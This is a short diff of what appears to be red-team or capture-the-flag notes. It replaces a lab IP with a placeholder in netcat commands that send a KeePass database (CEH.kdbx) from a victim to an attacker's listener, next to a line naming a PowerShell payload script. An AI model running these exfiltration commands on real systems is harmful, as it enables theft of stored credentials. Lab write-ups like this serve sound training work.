@@ -83,4 +83,4 @@ python send_powershell_payload.py x.x.x.x LHOST 60002
 #RedTeam (Attacker) Listen for file
 nc -lp 1235 >CEH.kdbx
 #BlueTeam(Victim) Sent file
-nc64.exe -w 3 10.10.14.19 1235 < CEH.kdbx
+nc64.exe -w 3 x.x.x.x 1235 < CEH.kdbx
